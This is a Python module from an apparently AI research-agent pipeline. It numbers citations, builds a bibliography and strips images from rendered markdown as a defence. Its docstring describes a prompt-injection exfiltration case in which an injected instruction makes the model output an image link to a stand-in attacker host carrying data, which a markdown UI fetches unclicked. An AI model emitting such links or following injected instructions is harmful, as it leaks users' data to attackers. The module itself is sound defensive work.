"""Turning verified claims into something a human reads — spec 08.

Citation numbering, the bibliography and the one security rule live together
because they are one concern: how evidence is presented once the pipeline has
finished deciding what it believes. Keeping them out of the node means the
interface (12) can render a report it did not synthesize.

The security rule is `safe_render`, and it is enforcement rather than etiquette.
The classic exfiltration vector is an injected instruction that produces
`![](https://attacker/?d=<data>)`; a UI that renders markdown fires that GET with
nobody clicking anything. Stripping at render time works whether the image came
from the model, from a hostile page title, or from a claim that carried the
adversary's framing through both gates.
"""
from __future__ import annotations

import re
from collections import Counter
from collections.abc import Iterable

from state import Claim, Quote, Source

Numbering = dict[str, tuple[int, Source]]
"""source_id -> (citation number, source). One page, one number."""

IMAGE = re.compile(
    r"!\[[^\]]*\]\s*(?:\([^)]*\)|\[[^\]]*\])"   # ![alt](url) and ![alt][ref]
    r"|<img\b[^>]*>",                           # markdown renderers pass raw HTML through
    re.IGNORECASE,
)


def safe_render(markdown: str) -> str:
    """Strip every image, leaving links alone.

    Stripped rather than asked-for: an instruction the model may ignore is not a
    control, and the model is the component an injection would have compromised.
    Links survive because a link is a click and an image is a request nobody
    made — and because stripping them would take the bibliography with it.
    """
    return IMAGE.sub("[image removed]", markdown)


def number_sources(sources: Iterable[Source]) -> Numbering:
    """Number the sources 1..n in the order they were found.

    Deduplicated by `source_id` because the fan-out means two topics that both
    found the same page each appended a `Source` for it. Numbering the raw list
    would give one page two numbers and leave a gap where the duplicate was.
    """
    numbering: Numbering = {}
    for source in sources:
        if source.source_id not in numbering:
            numbering[source.source_id] = (len(numbering) + 1, source)
    return numbering


def citation(claim: Claim, numbering: Numbering) -> tuple[int, Quote] | None:
    """The number and the evidence this claim cites, or None if it cites nothing.

    The single gate on citability, used by the prompt block and the bibliography
    alike so the report and its source list cannot disagree about what was
    cited. A claim is citable only if verification passed it *and* the source it
    names is one the reader can look up.

    The first quote wins, and spec 07 leaves the quote it actually checked in
    front — so the evidence shown is the evidence that was verified rather than
    whichever quote the extractor happened to write down first.
    """
    if claim.verdict != "supported":
        return None
    for quote in claim.quotes:
        if quote.source_id in numbering:
            return numbering[quote.source_id][0], quote
    return None


def render_bibliography(numbering: Numbering, claims: list[Claim]) -> str:
    """The source list, and what verification made of each source.

    Sources that produced nothing are listed with a zero rather than dropped:
    the point is to show what the agent checked *and* what it discarded, not
    only what survived.
    """
    used = Counter(cite[0] for c in claims if (cite := citation(c, numbering)))

    lines = ["## Sources"]
    lines += [f"[{n}] {s.title} — {s.url}  ({used[n]} verified claim(s))"
              for n, s in sorted(numbering.values(), key=lambda pair: pair[0])] or ["none"]

    n_ok = sum(1 for c in claims if c.verdict == "supported")
    n_all = len(claims)
    lines += ["", "## Verification",
              f"{n_ok}/{n_all} extracted claims passed verification "
              f"({n_ok / max(n_all, 1):.0%})."]
    return "\n".join(lines)
